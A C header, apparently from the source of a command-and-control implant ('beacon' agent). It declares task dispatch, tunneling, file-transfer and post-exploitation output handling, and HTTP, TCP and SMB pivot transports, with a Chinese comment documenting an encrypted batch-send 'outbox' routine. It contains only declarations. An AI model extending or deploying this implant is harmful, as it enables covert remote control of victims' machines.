#pragma once

#include "beacon_agent.h"

#include "beacon_commands.h"
#include "beacon_context.h"
#include "beacon_cascade.h"
#include "beacon_crypto.h"
#include "beacon_packet.h"
#include "beacon_sleep.h"
#include "beacon_transport.h"

ByteBuf AgentBuildMetadataPayload(const BeaconContext* ctx);
ByteBuf AgentBuildHeartbeatPlain(const BeaconContext* ctx);
VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks);
VOID AgentFlushTransfers(BeaconContext* ctx);
VOID AgentFlushTunnels(BeaconContext* ctx);
VOID AgentHarvestTunnels(BeaconContext* ctx);
VOID AgentFlushCascade(BeaconContext* ctx);
VOID AgentFlushPostEx(BeaconContext* ctx);

/*
 * 统一的 outbox flush 骨架（批量版）。
 * 三种 transport（HTTP transform / TCP-external / internal cascade）共享
 * drain → 拼接所有包 → 一次加密 → 一次发送 → 一次分发响应 → free 的流程，
 * 仅"发送+收响应"步骤不同。调用方提供 send 回调，签名约定：
 *   - 输入 encrypted 为本 tick 全部 outbox 包拼接后一次性加密的密文
 *   - 输出 response 为本次发送收到的任务密文（可为空）
 *   - 返回 1 成功，0 失败（失败时骨架把整批包回塞 outbox 并停止）
 * ctx_sender 是回调上下文（heartbeat / session / upstream 等）。
 *
 * response 清理契约（所有实现必须一致，新增回调照抄此约定）：
 *   1. 回调开头必须 BbInit(response)；
 *   2. 失败路径（返回 0）：回调自身负责 BbFree(response)，保证无泄漏；
 *   3. 成功路径（返回 1）：response 所有权移交 AgentFlushOutbox，
 *      由其在消费完毕后统一释放；调用方在返回 0 后绝不访问 response。
 */
typedef INT (*OutboxSendFn)(BeaconContext* ctx, VOID* ctx_sender,
                            const ByteBuf* encrypted, ByteBuf* response);
INT AgentFlushOutbox(BeaconContext* ctx, OutboxSendFn send, VOID* ctx_sender);

INT AgentRunExternalHttp(Agent* agent);
INT AgentRunExternalTcp(Agent* agent);
INT AgentRunInternalTcp(Agent* agent);
INT AgentRunInternalSmb(Agent* agent);
